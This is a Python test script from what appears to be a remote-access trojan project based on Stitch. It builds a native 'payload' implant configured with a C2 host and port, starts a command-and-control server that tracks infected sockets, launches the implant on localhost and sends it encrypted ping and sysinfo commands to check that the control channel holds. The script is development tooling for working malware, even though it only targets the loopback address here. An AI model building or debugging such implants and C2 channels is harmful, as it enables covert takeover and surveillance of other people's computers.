#!/usr/bin/env python3
"""Test raw socket connection to see if C side is working"""

import os, sys, time, threading, subprocess, signal, socket, struct
sys.path.insert(0, '/workspace')

c2_port = 16600

# Compile
os.chdir('/workspace/native_payloads')
env = os.environ.copy()
env['C2_HOST'] = '127.0.0.1'
env['C2_PORT'] = str(c2_port)
result = subprocess.run(['bash', './build.sh'], capture_output=True, env=env, timeout=30)
print('✅ Compiled')

# Start C2
def run_c2():
    from Application import stitch_cmd
    server = stitch_cmd.stitch_server()
    server.l_port = c2_port
    server.run_server()
c2_thread = threading.Thread(target=run_c2, daemon=True)
c2_thread.start()
time.sleep(3)

# Launch payload
payload_proc = subprocess.Popen(['/workspace/native_payloads/output/payload_native'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
time.sleep(5)

from web_app_real import get_stitch_server
server = get_stitch_server()

target_id = list(server.inf_sock.keys())[0]
sock = server.inf_sock[target_id]

print(f'Connected: {target_id}')

# Try sending TWO commands and see if socket stays alive
print('\\nSending command 1 (ping)...')
try:
    from native_protocol_bridge import native_bridge
    native_bridge._encrypt_and_send(sock, native_bridge.create_command_packet(0x01, b''))
    print('  Sent command 1')
    
    # Try to receive response
    try:
        sock.settimeout(2.0)
        response = native_bridge.receive_response(sock)
        print(f'  Got response 1: {len(response) if response else 0} bytes')
    except Exception as e:
        print(f'  No response 1: {e}')
    
    # Check socket
    try:
        sock.getpeername()
        print('  ✅ Socket still connected after cmd 1')
    except:
        print('  ❌ Socket disconnected after cmd 1')
        
except Exception as e:
    print(f'  Error: {e}')

time.sleep(1)

print('\\nSending command 2 (sysinfo)...')
try:
    native_bridge._encrypt_and_send(sock, native_bridge.create_command_packet(0x03, b''))
    print('  Sent command 2')
    
    # Try to receive response
    try:
        sock.settimeout(2.0)
        response = native_bridge.receive_response(sock)
        print(f'  Got response 2: {len(response) if response else 0} bytes')
    except Exception as e:
        print(f'  No response 2: {e}')
    
    # Check socket
    try:
        sock.getpeername()
        print('  ✅ Socket still connected after cmd 2')
    except:
        print('  ❌ Socket disconnected after cmd 2')
        
except Exception as e:
    print(f'  Error: {e}')

print('\\n✅ Test complete')

# Cleanup
try:
    os.killpg(os.getpgid(payload_proc.pid), signal.SIGKILL)
except:
    pass
